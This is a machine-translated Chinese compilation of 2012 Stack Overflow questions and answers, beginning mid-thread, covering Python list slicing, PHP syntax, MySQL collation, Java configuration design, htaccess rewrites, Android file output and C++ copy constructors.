> 赞同：45
> 
> 时间：2012-07-28T15:47:28.737

这应该可以满足您的需要 - 从偏移量 0 或 1 定期对列表进行采样：

```
>>> a = ['blah', 3,'haha', 2, 'pointer', 1, 'poop', 'fire']
>>> a[0:][::2] # even
['blah', 'haha', 'pointer', 'poop']
>>> a[1:][::2] # odd
[3, 2, 1, 'fire'] 
```

请注意，在上面的示例中，第一个切片操作 ( `a[1:]`) 演示了从所需的起始索引中选择所有元素，而第二个切片操作 ( `a[::2]`) 演示了如何选择列表中的每个其他项目。

更惯用和更有效的切片操作将两者合二为一，即`a[::2]`(`0`可以省略) 和`a[1::2]`，它避免了不必要的列表复制，应该在生产代码中使用，正如其他人在评论中指出的那样。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-28T15:51:02.897

您可以只对列表进行切片：对于奇数：`a[1::2]` 对于偶数：`a[::2]`

# javascript - Crocodoc 文档字体在移动设备上太小

> ID：11702418
> 
> 赞同：1
> 
> 时间：2012-07-28T15:43:14.227
> 
> 标签：javascript, css, responsive-design, font-size, crocodoc

我正在尝试使用[Crocodoc](http://crocodoc.com)查看我网站上的文档。这些文档在桌面上看起来不错，但它们的缩放算法过于严格，导致字体在移动设备上太小。例如，查看此链接并重新调整浏览器大小或在手机上查看：[https ://crocodoc.com/view/92GF0fI39qf4YlCK18njk7LOaz6qtCuVVFQU5T1TbK-HARw_oJutfq7clutH5rYCEoV85rk9a05kdE-du4A9LdEaNIW0cORvFuQHlQ](https://crocodoc.com/view/92GF0fI39qf4YlCK18njk7LOaz6qtCuVVFQU5T1TbK-HARw_oJutfq7clutH5rYCEoV85rk9a05kdE-du4A9LdEaNIW0cORvFuQHlQ)

**更新**以包含永久链接，因为会话链接在一小时后到期：[https ://crocodoc.com/see-it-in-action/](https://crocodoc.com/see-it-in-action/)

当您从 ~宽度缩小到 ~宽度时，字体大小从 ~`10em`到 ~ 。太小而无法在任何设备上查看而无需放大，这很烦人，因为文档不适合屏幕。`3em``960px``320px``3em`

我没有看到一个简单的修复程序，我想知道是否有人使用 Crocodoc 来了解如何处理这个 UX 问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T23:06:36.937

我认为这里有一个轻微的误解。Crocodoc 不会根据显示的大小来缩放文本。相反，当第一次查看文档时，努力缩放整个页面/文档以最佳地出现在屏幕上。Crocodoc 文档是原始文档的像素完美渲染，而不是像您在电子阅读器中看到的那样重排文本。当您放大和缩小整个文档的比例时，会相应地改变，就像在预览等中一样。这是否清楚？

顺便说一句，您的链接将不再有效，因为文档查看会话会在 1 小时后过期。

# php - PHP打印脚本错误

> ID：11702419
> 
> 赞同：0
> 
> 时间：2012-07-28T15:43:16.423
> 
> 标签：php

我正在尝试实现下面的脚本以在假定的页面上打印图像，但这反而会导致页面出现问题。

```
 <?php
     if ($currentpage == '/services/') {
         print("<img src="path/to/services.png" alt=""/>");
     },
      if ($currentpage == 'contact.php') {
         print("<img src="path/to/image.png" alt=""/>")
     },
     else {
         print("<img src="path/to/image.png" alt=""/>")
     }
     ?> 
```

错误信息是：

> 解析错误：语法错误，第 173 行 /home/master/public_html/wp-content/themes/siteripe-001/othe-rpages.php 中的意外 T_STRING

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:44:51.543

您在最后两个打印语句的末尾错过了分号。并且还需要转义双引号。您可以在双引号之前使用反斜杠字符来转义它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:54:18.463

如果块中只有一行代码，则不需要括号。
在您的情况下，将一个`if`块与`elseif`and一起使用`else`比使用多个块更有效`if`：您总是在测试同一个变量（$currentpage），因此只会执行一个块。
我还用单引号替换了一些双引号。

```
<?php
    if ($currentpage == '/services/')
        print('<img src="path/to/services.png" alt=""/>');
    elseif ($currentpage == 'contact.php')
        print('<img src="path/to/image.png" alt=""/>');
    else
        print('<img src="path/to/image.png" alt=""/>');
?> 
```

第二张图片不应该`contact.png`代替`image.png`吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:45:41.163

你忘记了一些分号并且你有太多的双引号。您需要嵌套引号，如下所示：

```
<?php
     if ($currentpage == '/services/') {
         print('<img src="path/to/services.png" alt=""/>');
     },
      if ($currentpage == 'contact.php') {
         print('<img src="path/to/image.png" alt=""/>');
     },
     else {
         print('<img src="path/to/image.png" alt=""/>');
     }
?> 
```

# c# - 遍历 gridview 并查看是否选中了复选框，然后使用 ASP .net 获取第一列值

> ID：11702420
> 
> 赞同：1
> 
> 时间：2012-07-28T15:43:19.030
> 
> 标签：c#, asp.net, vb.net, visual-studio-2010, gridview

我想遍历gridview并查看是否选中了复选框然后使用ASP .net gridview获取第一列值代码看起来正确...但是当我将else语句添加到代码中然后放入else中时会发出警报然后当我在gridview中检查并单击button1时，他们向我显示警报而不是执行命令我会尝试这个但它不起作用：

```
Protected Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click

        For i As Integer = 0 To DossierGV.Rows.Count - 1
            If DirectCast(DossierGV.Rows(i).Cells(0).FindControl("CheckBox1"), CheckBox).Checked = True Then
                execSQL("update OFPPT_Envoyer set vue = '1' where ID_Dossier = " & (DossierGV.Rows(i).Cells(1).Text), "e")
            End If
        Next
    End Sub 
```

这是 gridview ：

```
 &nbsp;<asp:Button ID="Button1" runat="server" Text="Vue" />
           <asp:GridView ID="DossierGV" runat="server" AllowSorting="True" 
               AutoGenerateColumns="False" DataKeyNames="ID_Dossier" 
               DataSourceID="SqlDataSource1">
               <Columns>
                <asp:TemplateField HeaderText="Choisir">
                       <EditItemTemplate>
                           <asp:CheckBox ID="CheckBox1" runat="server" />
                       </EditItemTemplate>
                       <ItemTemplate>
                           <asp:CheckBox ID="CheckBox1" runat="server" />
                       </ItemTemplate>
                   </asp:TemplateField>
                   <asp:BoundField DataField="ID_Dossier" HeaderText="ID_Dossier" ReadOnly="True" 
                       SortExpression="ID_Dossier" />
                   <asp:BoundField DataField="I ....................
.............................. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:19:14.270

问题是因为我`Me.DataBind()`在加载事件中添加了 (( ))

# mysql - mysql utf8 latin，重复键输入失败

> ID：11702432
> 
> 赞同：1
> 
> 时间：2012-07-28T15:44:44.893
> 
> 标签：mysql, utf-8, character-encoding

我刚刚收到一个 SQL 插入脚本，但它在重复的键条目上失败：

我正在尝试插入：

1)蒙大拿

2)蒙大拿州

我的表都是utf8_spanish2_ci，

谁能解释为什么会这样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:51:54.533

`utf8_spanish2_ci` [排序规则](https://stackoverflow.com/questions/3324900/i-dont-understand-collation-mysql-rdbms-character-sets)确实不仅不区分大小写，而且部分不区分重音，所以~~`ñ`= `n`。~~（正如 Joni Salonen 指出的那样，这是不正确的！）但是`á`= `a`。

~~据我所知，*除了*`utf8_bin`.~~

你可以做什么：

*   对表使用二进制排序规则（但这会带来[其他问题](https://stackoverflow.com/questions/5526334/what-effects-does-using-a-binary-collation-have)）
*   *对特定列*使用二进制排序规则（可能是您最好的选择）
*   使用不同的列作为键列-您确定该列首先需要是唯一键吗？如果这是用于主键，那么数字自动增量不是更适合吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-29T10:29:32.497

你确定这个特定的列有排序规则`utf8_spanish2_ci`吗？

根据此排序规则，Montana 和 Montaña 两个词不相等，您可以使用以下 SQL 进行验证：

```
mysql> select 'Montana' = 'Montaña' collate utf8_spanish2_ci as eq;
+----+
| eq |
+----+
|  0 |
+----+ 
```

排序规则是否有可能以某种方式更改为 utf8_general_ci？在这个排序规则中，n 和 ñ 是相等的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:47:50.697

这很可能是由于排序规则认为蒙大拿州和蒙大拿州是相同的。

（排序规则确定字符串比较的结果。）

# java - 在哪里保存选项值、重要文件的路径等

> ID：11702437
> 
> 赞同：7
> 
> 时间：2012-07-28T15:45:24.470
> 
> 标签：java

我正在创建一个程序，该程序需要设置一些选项值以及图像文件的一些路径、SQLite 数据库的路径、有关各种按钮上的文本的一些信息、有关要使用的数据库的信息（例如 SQLite / MySQL） ， ETC。

到目前为止，我有一个帮助类，其中我将所有内容都设为静态，并从程序中的任何地方访问它，但它变得一团糟，我读到这是一种不好的做法，因为它不遵循面向对象的编程指导方针。

所以我所做的是使该类成为一个单例，并在我的控制器对象中引用它。要访问我的选项，我现在调用 controller.getOptionName 而不是直接调用 Helper.getOptionName。

我有一种感觉，我正在以错误的方式处理这个问题，特别是因为从我所读到的内容来看，如果我的许多对象都依赖于一个类（辅助类），那么我没有足够地分离所有东西。

我不知道我应该做什么，是否有一个“标准”来保存我的所有选择？我考虑过使用 XML 文件或类似的东西，但我最终不得不从任何地方访问它，所以感觉这会产生同样的问题。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-28T19:03:18.870

**问题：配置蔓延**随着时间的推移，程序获得了功能和选项。当他们连接到外部系统和服务（例如数据库、事件代理、云/Web 服务）时，他们还必须为这些服务保留越来越多的配置和凭据。

在运行时存储此信息的传统位置是全局变量和操作系统环境变量。两者都*很烂*。配置数据在*逻辑上*是“全局环境”或应用程序运行的上下文，但您不能轻易依赖全局或环境变量。

另一种传统机制，配置文件——无论是 XML、INI、.properties 还是其他——帮助在运行之间存储配置数据，但在程序代码或执行期间不做任何组织配置/选项的操作。

您可以通过将选项添加到应用程序类的属性中来稍微清理一下。这是传统的“下一步”。不幸的是，它可能需要很多前期“什么去哪里？” 思维。海事组织，超过它的价值。即使你做出正确的选择，它也不会持久。如果你有一个功能相当丰富的应用程序，随着时间的推移，选项和设置的数量将变得不堪重负。您将花费大量时间手动编写对象构造函数中的默认值和选项以及其他方法的参数/代码。试图在类之间完美地划分配置不仅会耗费精力，还会导致高度相互依赖的类。这么多干净的封装！

我经常把头撞在这堵墙上，尤其是在针对所有代码都具有“合理”或“智能”默认值和行为的代码时，它允许用户随时覆盖默认值，并且提供了一个简单的界面不需要了解应用程序类和组件的完整相互作用即可使用其服务。

**解决方案：委托给一个配置对象**我发现的最佳解决方案是将选项/配置数据封装到它自己的指定对象中。描述这种模式的一种奇特方式：对于配置、设置和选项数据，使用[委托](http://en.wikipedia.org/wiki/Delegation_%28programming%29_)而不是[继承](http://en.wikipedia.org/wiki/Inheritance_%28object-oriented_programming%29)或[组合](http://en.wikipedia.org/wiki/Composition_in_object-oriented_programming)。

如何构建配置映射取决于您使用的语言。在许多语言中，构建自己的`Config`对象会给您一个漂亮的“外观”：

```
if opts.verbose:
    print "..." 
```

我发现它比访问属性的更明确的“getter”`opts.get("verbose")`或“indexer”方式更具可读性。`opts['verbose']`但是你通常不必自己制作`Config`类，它基本上只是一个映射。

●**简单方法**● 使用通用映射：例如在 Python 中 a `dict`，在 Perl 中 a `%hash`，在 Java 中 a`Dictionary`或`HashMap`。更好的是，这些扩展是为配置数据设计的，或者特别适用于配置数据。例如，在 Python 中，我使用[stuf](http://pypi.python.org/pypi/stuf)和[TreeDict](http://pypi.python.org/pypi/treedict)来实现它们的简单点访问和其他不错的属性。在 Java 中，`Properties`是一个类似的 specific-for-configs 扩展。例如：

```
from stuf import stuf   # stuf has attributes!

opts = stuf(
    show_module=False,  # comment explaining what show_module means
    where=True,         # ...
    truncate=False,     # ...
    everything=False,   # ...
    allvars=False,      # ...
    allkeys=False,      # ...
    yaml=False,         # ...
    on=True,            # ...
    ret=None,           # ...
)

if opts.truncate:
   ... 
```

这样，您的所有配置和选项数据都在一个地方，可以整齐地访问，并与它并排使用的所有其他程序、类、实例和函数/方法数据清晰地划分出来。随着程序的发展，这有助于随着时间的推移保持清晰。您可以快速确定“这部分是核心数据吗？还是与处理核心数据的上下文有关？”

为了使事情变得更好，如果您从配置文件中预加载配置数据，请将这些值直接加载或复制到您的配置对象中。如果您从命令行获取参数，请将这些值直接加载或复制到您的配置对象中。现在，您拥有了所有“用户希望我做什么，有哪些选项和设置？”的统一来源。信息。

* * *

TL;DR - 90% 的应用程序或服务只需简单的配置/选项映射即可。以下所有内容均适用于高级用例。因为这是一个设计/模式问题，这就是为什么这种方法不是一次性的，而是扩展到连续更复杂/复杂的用例。

● *Per-Instance Config* ● 您可以拥有多个级别的配置/选项数据。最常见的用途是在类或模块级别设置默认值，然后为每个实例设置不同的选项。服务器应用程序可能每个用户都有一个实例，每个用户/实例都需要自己的自定义设置。配置映射在实例创建/初始化时自动或显式复制。

●●*多个配置对象*●● 如果有意义的话，您可以将配置/选项数据划分为多个配置对象。例如，您可以对用于数据检索的选项与用于数据格式化的选项进行分区。您可以在设计开始时执行此操作，但不必这样做。您可以从一个单一的配置对象开始，然后随着时间的推移进行重构（通常，当您开始重构底层函数时）。显然，您不想“发疯”地添加配置对象，但是您可以拥有一些而不增加太多程序复杂性。如果您对配置对象进行分区，则可以通过单个 API 代理多个配置“域”——在内部为您提供质量信息分解，但外观非常简单。

◆ *Chain Gang* ◆ 比为每个实例复制配置数据更优雅：使用可链接或分层映射（例如在 Python 中`ChainMap`），让您可以将一个映射的值与另一个映射的值“叠加”（类似于“写时复制”方案） ，或“联合”和“半透明”文件系统）。然后实例选项直接引用类/默认选项——除非它们被明确设置，在这种情况下它们是特定于实例的。优点：如果在程序执行期间更改了类/默认/全局设置，后续实例方法调用将“看到”更改的默认值并使用它们（只要它们没有在实例级别被覆盖）。

◆◆*瞬态配置*◆◆ 如果您需要“即时”更改的配置/选项——比如说给定方法调用的范围——该方法可以扩展实例选项链式映射。在 Python 中，就是`ChainMap.new_child()`这样。这听起来很复杂，但就方法代码而言，它非常简单。仍然只有一个配置对象可以引用，无论它说什么是选项，使用它。

◆◆◆*任意持续时间叠加*◆◆◆ 方法调用的时间范围没有什么神奇之处。通过适当的设置，任何级别的配置都可以根据需要暂时叠加。例如，如果在程序运行期间有一段时间您想打开调试、日志记录或分析，您可以随时打开和关闭它——仅针对某些实例，或同时针对所有实例。这种*hors 类别* 的用法需要一个`Config`稍微超出库存的对象`ChainMap`——但不会太多（基本上只是链映射的[句柄）。](http://en.wikipedia.org/wiki/Handle_%28computing%29)

Happily, most code doesn't come close to needing these "black diamond" levels of config sophistication. But if you want to go three or four levels deep, delegating to separate config objects will take you there in a logical way that keeps code clean and orderly.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-28T17:02:06.300

我建议将您的选项放入某种文件中（无论是 xml 还是 .properties），尤其是在值可以更改的情况下（例如数据库用户名等）。我还要说您可以按组件分解这些配置文件。就像您分解代码一样，需要数据库信息的组件可能不需要图像路径。所以你可以有一个用于数据库信息、图像路径信息等的文件。然后让你的组件加载他们需要的文件。

在特定于 java 的情况下，您可以将这些文件放在类路径中并让组件引用它们。我喜欢使用 .properties 文件，因为 java 有一个很好的类[Properties](http://docs.oracle.com/javase/6/docs/api/java/util/Properties.html)来处理它们。

所以这里有一个图像提供者的小例子，它给你一个 BufferedImage，给定文件名。

图像属性

```
 icon.path=/path/to/my/icons
 background.path=/path/to/my/backgrounds 
```

确保此文件位于您的类路径中。然后这是我的提供者类

```
 public class ImageProvider {
    private static final String PROP_FILE = "image.properties"; 
    private static final String ICON_PATH = "icon.path";

    private Properties properties; 

    public ImageProvider() {
      properties = new Properties();
      properties.load(getClass().getClassLoader().getResourceAsStream(PROP_FILE));
    }

    public BufferedImage getIcon(String icon) {
      return ImageIO.read(properties.getProperty(ICON_PATH) + icon);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-29T15:37:01.513

times when configuration was kept in static variables or when every component access them independently has ended long ago. since then mankind has invented IoC and DI. you take a DI library (e.g. spring), use it to load all the configuration (from files, jndi, environment, user, you name it) and inject it to every component that needs it. no manual resource loading, no static configuration - it's just evil

# linux - 守护进程和应用程序控制

> ID：11702443
> 
> 赞同：0
> 
> 时间：2012-07-28T15:46:31.353
> 
> 标签：linux, bash, unix, process, daemon

这是来自此处的重复问题： 仅使用更新的标签[控制守护程序和应用程序的差异，](https://stackoverflow.com/questions/11695138/differences-in-controlling-daemons-applications) 以便更多人可以查看和评论。

* * *

大家好，

关于这篇优秀的帖子：

[nohup 和守护进程有什么区别？](https://stackoverflow.com/questions/958249/whats-the-difference-between-nohup-and-a-daemon)

我想问以下问题：

从我的终端启动应用程序后，该应用程序继续在后台或前台运行，我唯一能与之交互的方法就是从我的终端发送信号（假设标准输入仍然存在）。

但是，在启动守护进程后，我意识到可以通过其他方式控制它，例如查询它或重新启动它（arch方式）：

`# /etc/rc.d/daemon-name {start|stop|restart|status|...}`

有人可以向我解释该功能是否内置于通用“守护程序框架”并作为特殊功能适用于每个守护程序进程，还是只是设计为作为守护程序运行的进程必须在内部处理的规定？

更重要的是，我们究竟如何能够使用它们的名称从终端“控制”守护程序（即 sambad stop），而应用程序总是必须使用它们的名称来引用（即 kill -9 1234）？

先感谢您！

* * *

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:10:26.820

对于不同的守护进程，这是不同的。只需查看这些文件 ( `/etc/rc.d/*`)，看看它是如何完成的。

在 debian 上，大多数服务使用[start-stop-daemon](http://man.he.net/man8/start-stop-daemon)。PID 存储在文件中`start-stop-daemon`并向该 PID 发送信号。

# php - 我无法构建的 SQL 查询（加入）

> ID：11702447
> 
> 赞同：0
> 
> 时间：2012-07-28T15:47:27.450
> 
> 标签：php, mysql, join, left-join

抱歉，标题不明确。

我在 PHP 上使用 MySQL。

这些是我的表：

```
+++++++++++++++++++++++  
|........thread.......|  
+++++++++++++++++++++++  
|.id.|..title..|..ok..|  
+++++++++++++++++++++++  
|.45.|.baslik.|...1...|  
|.53.|.baslik.|...0...|  
|.56.|.baslik.|...1...|  
+++++++++++++++++++++++  

+++++++++++++++++++++++++++++++++  
|............comment............|  
+++++++++++++++++++++++++++++++++  
|.id.|..text..|.ok.|.thread_id..|  
+++++++++++++++++++++++++++++++++  
|.1..|.falan..|.0..|....45......|  
|.3..|.filan..|.1..|....56......|  
+++++++++++++++++++++++++++++++++ 
```

我需要的是获取“线程”表的所有检查（ok = 1）行，行数提供thread.id = comment.thread_id和comment.ok = 1的相等性。

当我使用以下查询时，我会检查或未检查所有评论计数。

```
select thread.*, count( comment.thread_id ) as countComment from `thread` left join `comment` on thread.id=comment.thread_id where thread.ok='1' group by thread.id 
```

我想得到的输出必须像下面这样。

```
++++++++++++++++++++++++++++++++++++  
|.id.|.title..|..ok.|.commentCount.|  
++++++++++++++++++++++++++++++++++++  
|.45.|.baslik.|...1.|......0.......|  
|.56.|.baslik.|...1.|......1.......|  
++++++++++++++++++++++++++++++++++++ 
```

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:52:35.063

试试这个：

`LEFT JOIN`评论`ON thread.id = comment.thread_id AND comment.ok = '1'`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:51:41.743

```
select thread.*, sum( comment.ok = 1) as countComment 
from `thread`
left join `comment` on thread.id=comment.thread_id
where thread.ok='1'
group by thread.id 
```

`count`用条件替换`sum`

# c# - 隐式委托强制转换

> ID：11702450
> 
> 赞同：1
> 
> 时间：2012-07-28T15:47:37.237
> 
> 标签：c#, dynamic, casting, delegates

我想知道是否有某种方法可以在不知道确切委托类型的情况下将方法组、匿名方法或 lambda 表达式转换为 System.Delegate，例如

```
var d = ()=>{};
dynamic d = ()=>{};
Delegate d = ()=>{}; 
```

我需要一种适用于具有任何参数和返回类型且不使用反射的任何方法的方法。感谢您的回答。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-28T15:54:59.493

不，这是不可能的，因为一个委托必须有一个定义的类型，但多个委托可以有相同的签名。这使得委托类型模棱两可——编译器无法在这样的语句中稳健地选择适当的类型。请注意，匹配签名但不同*类型*的委托实例***不可***互换。例如，是：

```
i => (i % 2) == 0 
```

一个`Func<int,bool>`，还是一个`Predicate<int>`？或者是其他东西？请注意，通用艺术的数量无关紧要；an `Action`and `ThreadStart`and`MethodInvoker`都是无效的非泛型无参数委托。

此外，还有一个额外的复杂性/歧义，因为 lambdas 也可以编译为*表达式树*，而不仅仅是委托：

```
Func<int, bool> x = i => (i % 2) == 0;
Expression<Func<int, bool>> y = i => (i % 2) == 0; 
```

表达式树与代表完全不同。

# google-chrome - Chrome 的“请求桌面站点”选项如何工作？

> ID：11702453
> 
> 赞同：98
> 
> 时间：2012-07-28T15:47:59.043
> 
> 标签：google-chrome, mobile

对于 iOS 谷歌浏览器，当用户点击“请求桌面站点”按钮时，浏览器会做什么来尝试调出桌面站点？我想像网站正在寻找的请求中的某种标题，或类似的东西？

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2012-07-28T16:19:51.510

我认为唯一的区别是`User-Agent:`请求中的标头。

以下是 Chrome 在我的 Android 设备上发送的 User-Agent 标头：

```
Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19

Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19 
```

请注意第一个中的“Mobile”一词，还提到了 Android 系统和设备。检查这些，我发现它还提供了虚假信息 - 即 X11 和 x86_64 - 与桌面 Linux 版本发送的值非常匹配铬合金。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2017-08-15T10:14:56.890

只是想指出，`User-Agent`如果您“请求桌面站点”，Chrome 现在不仅会更改而且还会忽略原始视口元标记。因此，不再需要嗅探`User-Agent`，您可以依赖视口更改，因为大多数响应式站点会自动执行此操作。请参阅[此更改](https://chromium.googlesource.com/chromium/src/+/5252baa9fbff3f1ffda51a4390cdf43070af22d7)以获取更多参考。

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2013-01-31T23:59:08.087

另一个细微的差别是，在任何重定向器移动它之前，请求似乎已经到达了最后一个有意输入的 URL。例如：

**给定：** somesite.com 嗅探代理，查看 Android，并执行 document.location += "/m";

**那么：**浏览器会有一个 URL somesite.com/m

**但是：**如果您“请求桌面站点”，它将更改用户代理并从 somesite.com 重新请求

**除非：**您首先直接进入 somesite.com/m 的移动 URL，在这种情况下，它只会重新加载 somesite.com/m。

我希望这适用于 HTTP 301 和 302 重定向，我知道它适用于 document.location 更改（至少如上所述），并推测它适用于 <meta> 刷新。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2017-09-06T15:38:33.600

这个 javascript 片段将有效地做同样的事情：

```
function requestDesktopSite() {
    document.getElementsByTagName('meta')['viewport'].content='min-width: 980px;';
}
```

```
<button onclick="requestDesktopSite()">Request Desktop Site</button>
```

# php - htaccess 麻烦重写语言参数

> ID：11702455
> 
> 赞同：0
> 
> 时间：2012-07-28T15:48:23.550
> 
> 标签：php, .htaccess, mod-rewrite

我在将子文件夹重写回文件时遇到问题。

**重定向有效，但不是最后一条规则。**

这是我正在尝试做的事情：

`domain.com/file.php?lang=fr`

想将其重写回

`domain.com/fr/file.php`

无论文件在哪个文件夹中。

我只使用一种语言是法语。

```
RewriteCond %{QUERY_STRING} ^lang=([A-Za-z-]+)/?$ 
RewriteRule ^(.*)\.php$ %1/$1.php?  [NS,R=301,L] 
RewriteRule ^fr/(.*)\.php/?$ $1.php?lang=fr&redirect=no [QSA,L] 
```

* * *

我当前的 htaccess 文件：

```
RewriteEngine On

RewriteBase /domain.com

RewriteCond %{QUERY_STRING} (^|&)lang=([A-Za-z-]+)(/?$|&)
RewriteCond %{QUERY_STRING} !(^|&)redirect=noneed($|&)
RewriteRule ^(.*)\.php$ %1/$1.php?  [NS,R=301,L]

RewriteRule ^fr/(.*)\.php/?$ http://localhost/?$1.php?lang=fr&redirect=noneed [QSA,L] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:04:53.323

第一条规则比第二条更强大，所以要解决你的问题，你必须在第一条写第二条。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:05:41.433

为什么不使用这样的系统：

```
RewriteRule ^(fr|en|es)/(accueil|home|bienvenida)/$ /index.php?lang=$1&act=index[QSA,L] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:06:24.580

尝试添加`RewriteBase`选项：

```
RewriteRule On
RewriteBase /

RewriteCond %{QUERY_STRING} ^lang=([A-Za-z-]+)/?$
RewriteRule ^(.*)\.php$ %1/$1.php?  [NS,R=301,L]

RewriteRule ^fr/(.*)\.php/?$ $1.php?lang=fr&redirect=no [QSA,L] 
```

（或者如果您不希望该选项`/`在所有路径的开头附加 a）

此外，您*似乎*`RewriteCond`没有正确处理查询字符串，任何其他参数都会导致您的第一个规则失败。改为这样做（我仍在考虑）：

 *~~~~```
RewriteRule On
RewriteBase /

RewriteCond %{QUERY_STRING} (^|&)lang=([A-Za-z-]+)(/?$|&)
RewriteCond %{QUERY_STRING} !(^|&)redirect=noneed($|&)
RewriteRule ^(.*)\.php$ %2/$1.php?  [NS,R=301,L]

RewriteRule ^fr/(.*)\.php/?$ $1.php?lang=fr&redirect=noneed [QSA,L] 
```~~~~*

# android - OnClickListener [Eclipse]

> ID：11702461
> 
> 赞同：-1
> 
> 时间：2012-07-28T15:49:30.090
> 
> 标签：android, variables, onclick, listener, onclicklistener

我想将添加到这些字段中的数据传递给存储在设备上的 .txt 文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:00:10.067

在您的 xml 文件中，您可以添加`android:onClick="bSomething"`到要单击的按钮的属性中。然后在您的活动课程（或您发布代码的位置）上，您可以执行以下操作：

```
public void bSomething(View view){
    try{

         FileOutputStream fout = openFileOutput(“yourfile.txt”,MODE_PRIVATE);

         OutputStreamWriter osw = new OutputStreamWriter(fOut);

         osw.write(editText1.getText().toString()+" ");
         osw.write(editText2.getText().toString()+" ");
         osw.write(editText3.getText().toString()+" ");

         osw.close();

         fout.close();

         }catch(Exception e){

             //do the exception handling
         }
     } 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:39:49.753

尝试做一些如下所示的事情：

```
Button btn11 = (Button) this.findViewById(R.id.buttonformdata);
btn11.setOnClickListener(new View.OnClickListener() {
    public void onClick(View v) {
        try{
              FileOutputStream fos = openFileOutput("yourFile", Context.MODE_PRIVATE);

              String string1 = editText1.getText().toString();
              String string2 = editText2.getText().toString();
              String string3 = editText3.getText().toString();

              fos.write(string1.getBytes());
              fos.write(string2.getBytes());
              fos.write(string3.getBytes());
              fos.close();

         }catch(Exception e){
              Log.e("Exception", e.toString());
         }
    }
}); 
```

让我知道它是否有效！

# c++ - 制作复制构造函数

> ID：11702462
> 
> 赞同：2
> 
> 时间：2012-07-28T15:49:32.960
> 
> 标签：c++, oop, reference, constructor, copy-constructor

我有一个关于复制构造函数的问题。我在互联网上看到了这些例子。第一个说没有复制构造函数，如果您在 student2 上更改某些内容，相同的字段也会在 student1 上更改。但是在第二个示例中，由于复制构造函数，student2 上的更改不会影响 student1。我不明白这是怎么发生的，实际上复制构造函数在这里做什么？（抱歉英语不好）（感谢所有答案:)）

```
class MITStudent {
public:
    int studentID;
    char *name;
    MITStudent() {
        studentID = 0;
        name = "";
}

};
   int main() {
      MITStudent student1;
      student1.studentID = 98;
      char n[] = "foo";
      student1.name = n;
      MITStudent student2 = student1;
      student2.name[0] = 'b';
      cout << student1.name; // boo
 } 
```

第二个

```
class MITStudent {
public:
    int studentID;
    char *name;
    MITStudent() {
        studentID = 0;
        name = "";
    }

    MITStudent(MITStudent &o) {
        name = my_strdup(o.name);
        studentID = o.studentID;
    }

};
int main() {
   MITStudent student1;
   student1.studentID = 98;
   char n[] = "foo";
   student1.name = n;
   MITStudent student2 = student1;
   student2.name[0] = 'b';
   cout << student1.name; // foo 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:57:26.557

如果您不指定自己的，则会自动生成默认的复制构造函数。
他们只是按值将所有类的成员复制到新类。

当您将指针作为类成员时，通常会出现问题。
默认的复制构造函数只会复制指针所持有的地址。
这意味着原始类和复制类现在都指向同一个对象。

这正是您使用`char*`“字符串”的示例中发生的情况......

顺便说一句，作为一个经验法则..如果您有一个具有指针作为成员的类，请创建一个自定义复制构造函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:14:33.570

在典型情况下，使用默认的复制构造函数，情况将如左图[所示！](http://i.stack.imgur.com/6SjPQ.png). 实现了复制构造函数来避免这种情况，并具有右侧给出的场景。

然而，这通常发生在指针成员身上。所以，尽量避免它们。仅在以下情况下使用它们 1\. 只能在构造函数之后的阶段创建成员 2\. 想要销毁成员并重新创建它 3\. 想要使成员比对象更长寿。

就您而言，您似乎不在上述任何情况下。在这种情况下，您可以安全地使用漂亮的字符串对象，而不必担心任何悬空指针。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:54:02.803

如果您不创建一个复制构造函数，则会自动为您生成一个。自动生成的复制构造函数只会将指针复制到名称而不是名称本身。通过创建自己的构造函数，您可以手动复制整个名称，而不仅仅是指针。

在实际代码中，您可能希望使用 std::string 之类的东西而不是 char* 。这样，自动生成的复制构造函数就会做你想做的事，而你不需要自己编写。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T15:57:34.560

如果没有`MITStudent(MITStudent &o)`，则只是复制所有字段的值。因此，如果有一个指针字段，那么两个字段将包含相同的地址。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-28T15:58:14.787

在第一个示例中，复制构造函数由编译器隐式创建。

它基本上看起来像这样：

```
MITStudent(const MITStudent &o) {
    name = o.name;
    studentID = o.studentID;
} 
```

它只复制指针`name`。

